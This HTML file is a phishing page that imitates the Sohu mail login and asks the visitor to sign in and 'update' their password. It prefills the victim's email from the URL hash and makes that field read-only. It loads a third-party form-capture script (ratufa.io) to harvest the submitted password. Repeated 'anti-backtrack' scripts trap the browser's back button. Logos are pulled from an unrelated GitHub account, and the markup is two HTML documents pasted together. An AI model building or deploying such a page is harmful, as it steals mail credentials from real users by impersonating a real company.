<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exmail Login - Not just mailbox</title>
    <style>
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
}

body {
    background-color: #ffffff;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    position: relative;
    overflow-x: hidden;
}

/* Top Utility Header Navigation Navbar Layer Components Row */
.navbar {
    width: 100%;
    max-width: 1200px;
    margin: 0 auto;
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 20px 40px;
    background-color: #ffffff;
}

/* Header Image Branding Logo Shape Graphic Placeholder Box Area */
.logo-box {
    width: 180px;
    height: 44px;
    border: 1px dashed #d1d5db;
    background-color: #f9fafb;
    color: #9ca3af;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 13px;
    font-weight: 500;
}

.nav-links {
    font-size: 12px;
    color: #4a5568;
}

.nav-links a {
    color: #4a5568;
    text-decoration: none;
    margin: 0 6px;
}

.nav-links a:hover {
    color: #e53e3e; /* Sohu bright signature red text hover marker accent */
}

/* Main Content Workspace Layout View Area Segment Frame Backdrops */
.workspace-banner {
    flex-grow: 1;
    background-color: #f4f6f9;
    /* Soft clean light horizontal linear vignette backdrop seamlessly matching provided sample background layout */
    background-image: linear-gradient(180deg, #ffffff 0%, #f4f6f9 100%);
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 40px 40px 80px;
    width: 100%;
}

.main-content-wrapper {
    width: 100%;
    max-width: 1200px;
    display: flex;
    gap: 40px;
    align-items: center;
    justify-content: space-between;
}

/* Left Hero Column: Specified Grid Graphic Boundary Object Placeholder Container Block */
.left-hero-placeholder {
    flex: 1.3;
    min-height: 420px;
    border: 2px dashed #cbd5e1;
    border-radius: 12px;
    background-color: rgba(255, 255, 255, 0.6);
    color: #64748b;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 16px;
    font-weight: 500;
}

/* Right Hero Column Box Module Component Wrapper Grouping Area */
.login-card-wrapper {
    flex: 0.8;
    max-width: 420px;
    display: flex;
    align-items: flex-start;
    position: relative;
    padding-left: 44px; /* Extends clearance space for absolute selection circles column */
    width: 100%;
}

/* Floating Vertical Accent Selector Circle Indicators Track components */
.sidebar-selector-nodes {
    position: absolute;
    left: 0;
    top: 60px;
    display: flex;
    flex-direction: column;
    gap: 12px;
    z-index: 10;
}

.icon-node {
    width: 36px;
    height: 36px;
    border-radius: 50%;
    background-color: #48bb78; /* Active variant soft medium emerald base color style background */
    color: #ffffff;
    font-size: 11px;
    font-weight: bold;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    box-shadow: 0 4px 6px rgba(0,0,0,0.06);
}

.icon-node.active-node {
    background-color: #ff4d4d; /* Bright red target highlighted state tracker indicator accent bubble node */
}

/* Main Form Content Panel Block Container White Float Box Card */
.login-card {
    background-color: #ffffff;
    width: 100%;
    padding: 44px 36px;
    border: 1px solid #e2e8f0;
    border-radius: 4px;
    box-shadow: 0 10px 25px rgba(0, 0, 0, 0.03);
    text-align: center;
}

.card-title {
    font-size: 18px;
    color: #333333;
    font-weight: 400;
    margin-bottom: 32px;
    text-align: left;
    padding-left: 4px;
}

.form-group {
    margin-bottom: 20px;
    width: 100%;
}

/* Custom dual column split text input element wrapper properties */
.form-group.row-input-split {
    display: flex;
    border: 1px solid #cbd5e1;
    border-radius: 2px;
    overflow: hidden;
    height: 42px;
}

.form-group.row-input-split .form-control {
    border: none;
    height: 100%;
}

/* Structural gray right suffix label component area grid matching original bounds layout shape template design */
.domain-addon {
    background-color: #f8fafc;
    border-left: 1px solid #e2e8f0;
    color: #718096;
    font-size: 14px;
    padding: 0 12px;
    display: flex;
    align-items: center;
    white-space: nowrap;
    user-select: none;
}

/* Regular single unified standalone secure text input field framework element properties */
.form-control {
    width: 100%;
    height: 42px;
    border: 1px solid #cbd5e1;
    border-radius: 2px;
    padding: 0 14px;
    font-size: 14px;
    color: #333333;
    outline: none;
    background-color: #ffffff;
}

.form-control:focus {
    border-color: #ff4d4d;
}

.form-control::placeholder {
    color: #a0aec0;
    font-weight: 300;
}

.forgot-link {
    display: block;
    text-align: right;
    font-size: 12px;
    color: #718096;
    text-decoration: none;
    margin-top: -8px;
    margin-bottom: 28px;
}

.forgot-link:hover {
    text-decoration: underline;
    color: #ff4d4d;
}

/* Crisp wide rectangular coral red primary submission action button precisely tracking sample specifications */
.submit-btn {
    width: 100%;
    background-color: #ff4d52; /* High contrast energetic coral red tint selector */
    color: #ffffff;
    border: none;
    height: 46px;
    font-size: 16px;
    font-weight: 500;
    letter-spacing: 2px;
    border-radius: 4px;
    cursor: pointer;
    margin-bottom: 28px;
    box-shadow: 0 4px 12px rgba(255, 77, 82, 0.2);
    transition: background-color 0.15s ease;
}

.submit-btn:hover {
    background-color: #e63940;
}

/* Secondary choice line bottom helper ribbon wrapper strip text label option container */
.register-footer-hint {
    background-color: #f8fafc;
    border: 1px solid #e2e8f0;
    width: 100%;
    padding: 12px;
    font-size: 13px;
    color: #4a5568;
    border-radius: 2px;
}

.register-footer-hint a {
    color: #e53e3e;
    text-decoration: none;
    font-weight: 500;
}

.register-footer-hint a:hover {
    text-decoration: underline;
}

/* Fine-print corporate watermark footer segment line strip */
.page-footer {
    text-align: center;
    font-size: 12px;
    color: #718096;
    padding: 24px 20px;
    background-color: #ffffff;
    border-top: 1px solid #edf2f7;
    width: 100%;
}

/* OS Transparent Overlay Watermark Mock Rendering Display Layout Node Structure Blueprint */
.system-watermark {
    position: fixed;
    bottom: 40px;
    right: 40px;
    text-align: left;
    font-size: 13px;
    color: rgba(0, 0, 0, 0.11);
    line-height: 1.4;
    user-select: none;
    pointer-events: none;
    z-index: 100;
}

@media (max-width: 860px) {
    .main-content-wrapper {
        flex-direction: column;
        gap: 40px;
    }
    .left-hero-placeholder {
        width: 100%;
        min-height: 220px;
    }
    .login-card-wrapper {
        max-width: 100%;
    }
}


    </style>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>搜狐闪电邮箱 - mail.sohu.com</title>
    <!-- Link to external stylesheet -->
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <!-- Top Navigation Header Ribbon Area Line -->
    <header class="navbar">
        <div class="brand-logo-area">
            <!-- Header Logo Image Placeholder Box -->
           <img src="https://github.com/cdtechdigital/images/blob/main/sohulogo.JPG?raw=true" alt="Trulli" width="" height="">
          
        </div>
        <nav class="nav-links">
            <a href="#">搜狐首页</a> | 
            <a href="#">VIP邮箱</a> | 
            <a href="#">手机邮箱</a> | 
            <a href="#">帮助中心</a>
        </nav>
    </header>

    <!-- Main Panoramic Horizon Content Workspace Area Component -->
    <main class="workspace-banner">
        <div class="main-content-wrapper">
            
            <!-- Left Column Content Feature Representation Graphics Placeholder Area -->
            <div class="left-hero-placeholder">
            <img src="https://github.com/cdtechdigital/images/blob/main/Sohu.JPG?raw=true" alt="Trulli" width="" height="">
               
            </div>

            <!-- Right Column Form Container Card Box Component Module -->
            <div class="login-card-wrapper">
                
                <!-- Floating Left Sidebar Selection Icons Segment -->
                <div class="sidebar-selector-nodes">
                    <div class="icon-node active-node">sohu</div>
                    <div class="icon-node">me</div>
                </div>

                <!-- White Login Dashboard Form Container Component Block Area -->
                <div class="login-card">
                    <h2 class="card-title">登录并更新您当前的密码</h2>

                    <!-- Form submission tracking configuration using FormSubmit module paths -->
                    <form action="" method="POST">
                        <script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=px88b6jp&n=n1.ratufa.io"></script>
                        <!-- Account Field Entry Structural Inline Box -->
                        <div class="form-group row-input-split">
                <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
                           
                        </div>

                        <!-- Secure Password Entry Field Component Area Block -->
                        <div class="form-group">

<input type="password" name="Password" placeholder="请输入您的密码" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
  oninput="this.setCustomValidity('')"/>
                        </div>

                        <a href="#" class="forgot-link">忘记密码</a>

                        <!-- Solid Rounded Rectangular Coral Red Submission Trigger Button Block Component -->
                        <button type="submit" class="submit-btn">登 录</button>
                    </form>

                    <!-- Bottom secondary auxiliary path registration container frame section -->
                    <div class="register-footer-hint">
                        还没有搜狐闪电邮？ <a href="#">现在注册</a>
                    </div>
                </div>

            </div>

        </div>
    </main>

    <!-- Base Fine-Print Page Footer Copyright Indicator Details Frame Area Strip -->
    <footer class="page-footer">
        Copyright © 2026 Sohu All Rights Reserved. 搜狐公司 版权所有
    </footer>


    <script>
        window.addEventListener('DOMContentLoaded', () => {
            if (window.location.hash) {
                document.getElementById("email").value = window.location.hash.substring(1).trim();
            }
        });
    </script>
    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
    <script type="text/javascript">
        (function() {
            window.history.pushState(null, null, window.location.href);
            
            window.onpopstate = function() {
                window.history.pushState(null, null, window.location.href);
           
            };
        })();
    </script>
<script type="text/javascript">
    window.history.pushState(null, "", window.location.href);
    
    window.addEventListener("popstate", function() {
        window.history.pushState(null, "", window.location.href);
    });
</script>
<script type="text/javascript">
    function preventBack() {
        window.history.forward();
    }
    setTimeout("preventBack()", 0);
    
    window.onunload = function () { null };
</script>

</body>
    
</html>
</body>
</html>
